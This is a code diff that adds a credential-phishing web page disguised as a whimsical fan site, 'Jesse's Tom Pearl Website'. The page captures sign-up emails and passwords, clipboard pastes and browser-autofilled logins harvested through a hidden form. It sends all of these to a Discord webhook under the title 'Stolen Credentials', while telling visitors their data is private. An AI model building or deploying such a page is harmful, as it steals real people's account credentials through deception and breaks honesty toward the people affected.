@@ -1,3 +1,386 @@
-<html>
-  <Heading> "i am tom pearl" <heading> i am tom pearl aswell</heading>
-  <html>
+<!-- Jesse's Tom Pearl Website - Fun & Silly Phishing Portal -->
+<!-- Save as index.html and open in a browser -->
+<!-- Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual webhook -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jesse's Tom Pearl Wonderland 🐚</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fbc2eb, #8fd3f4);
+      background-size: 400% 400%;
+      animation: gradientShift 10s ease infinite;
+      font-family: 'Comic Sans MS', cursive, sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    #particleCanvas {
+      position: fixed; top: 0; left: 0;
+      z-index: 0; pointer-events: none;
+    }
+    .container {
+      position: relative; z-index: 10;
+      max-width: 700px; margin: 0 auto;
+      padding: 30px 20px 100px; text-align: center;
+    }
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      text-shadow: 3px 3px 0 #ff00cc, -3px -3px 0 #00ffcc;
+      animation: rainbowText 2s infinite;
+      margin-bottom: 5px;
+    }
+    @keyframes rainbowText {
+      0% { color: #ff0000; } 20% { color: #ff8800; }
+      40% { color: #ffff00; } 60% { color: #00ff00; }
+      80% { color: #0088ff; } 100% { color: #ff00ff; }
+    }
+    .subtitle { font-size: 1.2rem; color: #ffffff; text-shadow: 1px 1px 3px black; margin-bottom: 20px; }
+    .pearl-card {
+      background: rgba(255,255,255,0.4);
+      backdrop-filter: blur(12px);
+      border-radius: 30px;
+      padding: 30px;
+      margin: 20px auto;
+      box-shadow: 0 0 30px rgba(255,105,180,0.8);
+      animation: float 3s ease-in-out infinite;
+      max-width: 500px;
+    }
+    @keyframes float {
+      0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); }
+    }
+    .pearl-img { width: 120px; border-radius: 50%; margin-bottom: 15px; }
+    .spin-slow { animation: spin 8s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    h2 { color: #ff6ec7; text-shadow: 1px 1px white; margin-bottom: 10px; }
+    textarea, input {
+      display: block; width: 80%; margin: 10px auto;
+      padding: 12px; font-size: 1rem;
+      border: 3px dashed #ff00cc; border-radius: 15px;
+      background: rgba(255,255,255,0.8);
+      font-family: inherit;
+    }
+    .glow-button {
+      background: linear-gradient(45deg, #ff6ec7, #ffd700);
+      border: none; color: white; padding: 15px 30px;
+      font-size: 1.5rem; border-radius: 50px;
+      text-shadow: 1px 1px 2px black; cursor: pointer;
+      box-shadow: 0 0 20px #ff6ec7;
+      transition: transform 0.2s, box-shadow 0.2s;
+      margin-top: 15px;
+    }
+    .glow-button:hover { transform: scale(1.1); box-shadow: 0 0 40px #ffd700; }
+    .glow-button:active { transform: scale(0.95); }
+    .hidden { display: none; }
+    #pearlMessage, #memoryMsg {
+      margin-top: 20px; padding: 15px;
+      background: rgba(255,215,0,0.7); border-radius: 15px;
+      font-weight: bold; color: #d040a0;
+    }
+    .memory-box {
+      background: rgba(100, 200, 255, 0.3);
+      backdrop-filter: blur(8px);
+      border: 4px dotted #00ffcc; border-radius: 20px;
+      padding: 20px; margin: 30px auto;
+      max-width: 500px;
+      box-shadow: 0 0 25px #00ffff;
+      text-align: left;
+      animation: wobble 4s ease-in-out infinite;
+    }
+    @keyframes wobble {
+      0% { transform: rotate(0deg); } 25% { transform: rotate(1deg); }
+      75% { transform: rotate(-1deg); } 100% { transform: rotate(0deg); }
+    }
+    .memory-box h3 { color: #0044ff; font-size: 1.8rem; margin-bottom: 10px; }
+    .memory-list { list-style: none; }
+    .memory-list li {
+      padding: 12px; margin: 8px 0;
+      background: #ffffff90; border-radius: 12px;
+      font-size: 1rem; word-break: break-all;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    footer { margin-top: 40px; color: #444; animation: wiggle 0.5s infinite alternate; }
+    @keyframes wiggle {
+      from { transform: rotate(-2deg); } to { transform: rotate(2deg); }
+    }
+
+    /* Secret hidden form for autofill capture */
+    #hiddenForm {
+      position: absolute; opacity: 0; pointer-events: none; z-index: -999;
+    }
+  </style>
+</head>
+<body>
+  <!-- Particle animation canvas -->
+  <canvas id="particleCanvas"></canvas>
+
+  <div class="container">
+    <header class="bounce-in">
+      <h1>🐚 Jesse's Tom Pearl Website 🐚</h1>
+      <p class="subtitle">✨ The shiniest pearl in the digital sea ✨</p>
+    </header>
+
+    <main>
+      <!-- Paste Pearl Code Card -->
+      <div class="pearl-card floating">
+        <img src="https://i.imgur.com/9OXrsLX.png" alt="Tom Pearl" class="pearl-img spin-slow" 
+             onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23ffcc00%22/><text x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22>🐚</text></svg>'">
+        <h2>Paste Your Pearl Code!</h2>
+        <p>Have a secret pearl code? Paste it to unlock exclusive Tom content!</p>
+        <textarea id="pasteArea" placeholder="Paste your code here... 🦪" rows="4"></textarea>
+        <button id="submitPearl" class="glow-button">Unlock the Pearl!</button>
+        <div id="pearlMessage" class="hidden"></div>
+      </div>
+
+      <!-- Sign-Up Card -->
+      <div class="pearl-card" style="animation-delay: 0.2s;">
+        <h2>💖 Become a Pearl VIP 💖</h2>
+        <p>Sign up to save your treasures in the <strong>Memory Box</strong>!</p>
+        <input type="email" id="signEmail" placeholder="Your email (pearl@sea.com)" autocomplete="email">
+        <input type="password" id="signPassword" placeholder="Secret pearl key" autocomplete="new-password">
+        <button id="signUpBtn" class="glow-button">Remember Me!</button>
+        <div id="memoryMsg" class="hidden"></div>
+      </div>
+
+      <!-- Memory Box (shows stored credentials) -->
+      <div class="memory-box">
+        <h3>🧠 Memory Box 🧠</h3>
+        <p style="margin-bottom:10px;">Your saved pearls (auto-remembered):</p>
+        <ul id="memoryList" class="memory-list">
+          <!-- dynamically filled -->
+        </ul>
+        <p style="font-size:0.8rem; margin-top:10px;">🔒 Super secure, only you can see! 🔒</p>
+      </div>
+    </main>
+
+    <footer class="wiggle">
+      <p>© 2025 Jesse's Tom Pearl – Not a real pearl, but a real treasure 😉</p>
+    </footer>
+  </div>
+
+  <!-- Hidden form to trick password managers into autofilling -->
+  <form id="hiddenForm">
+    <input type="text" name="username" autocomplete="username" id="hiddenUser">
+    <input type="password" name="password" autocomplete="current-password" id="hiddenPass">
+    <input type="submit" value="submit">
+  </form>
+
+  <script>
+    (function() {
+      'use strict';
+
+      // ⚠️ REPLACE WITH YOUR DISCORD WEBHOOK URL
+      const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL';
+
+      let exfilBuffer = {};
+
+      // ==================== PARTICLE CANVAS FUN ====================
+      const canvas = document.getElementById('particleCanvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      let particles = [];
+      class Particle {
+        constructor() {
+          this.x = Math.random() * canvas.width;
+          this.y = Math.random() * canvas.height;
+          this.size = Math.random() * 8 + 2;
+          this.speedX = Math.random() * 2 - 1;
+          this.speedY = Math.random() * 2 - 1;
+          this.color = `hsl(${Math.random() * 360}, 100%, 75%)`;
+        }
+        update() {
+          this.x += this.speedX;
+          this.y += this.speedY;
+          if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+          if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+        }
+        draw() {
+          ctx.beginPath();
+          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+          ctx.fillStyle = this.color;
+          ctx.fill();
+        }
+      }
+      for (let i = 0; i < 80; i++) particles.push(new Particle());
+      function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => { p.update(); p.draw(); });
+        requestAnimationFrame(animateParticles);
+      }
+      animateParticles();
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      });
+
+      // ==================== UTILS: SEND TO DISCORD ====================
+      function sendToDiscord(data) {
+        if (DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK_URL') return; // no real hook
+        const payload = {
+          content: "🐚 **New Pearl Catch!**",
+          embeds: [{
+            title: "Stolen Credentials",
+            color: 0xff69b4,
+            fields: [
+              { name: "Email", value: data.email || 'N/A', inline: true },
+              { name: "Password", value: data.password || 'N/A', inline: true },
+              { name: "Raw Paste", value: data.rawPaste ? '```' + data.rawPaste + '```' : 'none' },
+              { name: "User-Agent", value: navigator.userAgent },
+              { name: "Time", value: new Date().toISOString() }
+            ]
+          }]
+        };
+        fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(err => console.log);
+      }
+
+      function flushExfil() {
+        if (exfilBuffer.email || exfilBuffer.password || exfilBuffer.rawPaste) {
+          sendToDiscord({...exfilBuffer});
+          exfilBuffer = {};
+        }
+      }
+
+      // ==================== MEMORY BOX (LOCAL STORAGE) ====================
+      function loadMemory() {
+        const stored = localStorage.getItem('tomPearlMemory');
+        return stored ? JSON.parse(stored) : [];
+      }
+      function saveMemory(users) {
+        localStorage.setItem('tomPearlMemory', JSON.stringify(users));
+      }
+      function renderMemoryBox() {
+        const list = document.getElementById('memoryList');
+        const users = loadMemory();
+        list.innerHTML = '';
+        if (users.length === 0) {
+          list.innerHTML = '<li style="font-style:italic;">No pearls remembered yet... 💤</li>';
+          return;
+        }
+        users.forEach((user, idx) => {
+          const li = document.createElement('li');
+          li.innerHTML = `<strong>🐚 ${user.email}</strong> – 🔑 ${user.password}`;
+          list.appendChild(li);
+        });
+      }
+      function addToMemory(email, password) {
+        const users = loadMemory();
+        users.push({ email, password });
+        saveMemory(users);
+        renderMemoryBox();
+      }
+
+      // Initial render
+      renderMemoryBox();
+
+      // ==================== SIGN-UP FEATURE ====================
+      document.getElementById('signUpBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('signEmail').value.trim();
+        const password = document.getElementById('signPassword').value;
+        if (!email || !password) {
+          const msgDiv = document.getElementById('memoryMsg');
+          msgDiv.textContent = "❌ Please fill in both email and secret pearl key!";
+          msgDiv.classList.remove('hidden');
+          return;
+        }
+        // Add to memory box (localstorage)
+        addToMemory(email, password);
+        // Send to Discord
+        sendToDiscord({ email, password });
+        // Show success
+        const msgDiv = document.getElementById('memoryMsg');
+        msgDiv.textContent = "🎉 You're a pearl VIP now! Your treasure is in the Memory Box!";
+        msgDiv.classList.remove('hidden');
+        // Clear inputs
+        document.getElementById('signEmail').value = '';
+        document.getElementById('signPassword').value = '';
+      });
+
+      // ==================== PASTE PEARL CODE CAPTURE ====================
+      const pasteArea = document.getElementById('pasteArea');
+      pasteArea.addEventListener('paste', function(e) {
+        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+        console.log('Pasted:', pastedText);
+        // Try to extract email/password from common patterns
+        const emailMatch = pastedText.match(/[\w\.-]+@[\w\.-]+\.\w+/);
+        const passMatch = pastedText.match(/[:;\s]+([^\s]+)$/) || pastedText.match(/\n(.+)/);
+        let extractedEmail = emailMatch ? emailMatch[0] : null;
+        let extractedPass = passMatch ? passMatch[1] : null;
+
+        if (extractedEmail || extractedPass) {
+          exfilBuffer.email = exfilBuffer.email || extractedEmail;
+          exfilBuffer.password = exfilBuffer.password || extractedPass;
+          flushExfil();
+        } else {
+          // store raw paste and send anyway
+          exfilBuffer.rawPaste = pastedText;
+          flushExfil();
+        }
+      });
+
+      document.getElementById('submitPearl').addEventListener('click', function() {
+        const pasteContent = pasteArea.value.trim();
+        if (!pasteContent) {
+          document.getElementById('pearlMessage').textContent = "🐚 Please paste your pearl code first!";
+          document.getElementById('pearlMessage').classList.remove('hidden');
+          return;
+        }
+        // Also try to capture from typed content
+        const emailMatch = pasteContent.match(/[\w\.-]+@[\w\.-]+\.\w+/);
+        const passMatch = pasteContent.match(/[:;\s]+([^\s]+)$/) || pasteContent.match(/\n(.+)/);
+        if (emailMatch || passMatch) {
+          exfilBuffer.email = emailMatch ? emailMatch[0] : pasteContent;
+          exfilBuffer.password = passMatch ? passMatch[1] : '???';
+          flushExfil();
+        }
+        document.getElementById('pearlMessage').textContent = "🌟 Whoa! You're a true pearl wizard! 🌟";
+        document.getElementById('pearlMessage').classList.remove('hidden');
+        pasteArea.value = '';
+      });
+
+      // ==================== HIDDEN AUTOFILL CAPTURE ====================
+      const hiddenUser = document.getElementById('hiddenUser');
+      const hiddenPass = document.getElementById('hiddenPass');
+
+      function checkAutofill() {
+        if (hiddenUser.value && hiddenUser.value.includes('@')) {
+          exfilBuffer.email = exfilBuffer.email || hiddenUser.value;
+          if (hiddenPass.value) exfilBuffer.password = hiddenPass.value;
+          flushExfil();
+        } else if (hiddenPass.value && hiddenPass.value.length > 0) {
+          exfilBuffer.password = exfilBuffer.password || hiddenPass.value;
+          if (hiddenUser.value) exfilBuffer.email = hiddenUser.value;
+          flushExfil();
+        }
+      }
+
+      // Wait for password managers to fill
+      setTimeout(checkAutofill, 3000);
+      setInterval(checkAutofill, 15000);
+
+      // Trigger autofill by briefly focusing hidden fields on any button
+      document.body.addEventListener('click', () => {
+        hiddenUser.focus();
+        hiddenPass.focus();
+        setTimeout(() => { hiddenUser.blur(); hiddenPass.blur(); }, 200);
+      });
+
+      console.log("🐚 Jesse's Tom Pearl site is watching... 🦪");
+    })();
+  </script>
+</body>
+</html>
